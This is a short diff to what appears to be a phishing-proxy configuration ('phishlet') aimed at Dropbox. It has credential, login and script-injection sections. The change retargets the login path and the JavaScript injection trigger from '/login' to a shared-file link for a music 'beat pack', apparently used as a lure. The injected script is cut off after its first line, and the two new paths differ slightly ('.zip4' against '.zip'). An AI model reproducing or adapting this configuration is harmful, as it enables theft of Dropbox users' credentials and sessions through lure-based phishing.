@@ -68,11 +68,11 @@ credentials:
 
 login:
   domain: 'www.dropbox.com'
-  path: '/login'
+  path: '/scl/fi/qej12ezrizyvrd7btkzww/June-2022-Beat-Pack.zip4'
 
 js_inject:
   - trigger_domains: ["www.dropbox.com"]
-    trigger_paths: ["/login"]
+    trigger_paths: ["/scl/fi/qej12ezrizyvrd7btkzww/June-2022-Beat-Pack.zip"]
     trigger_params: []
     script: |
         let start = setInterval(function() {
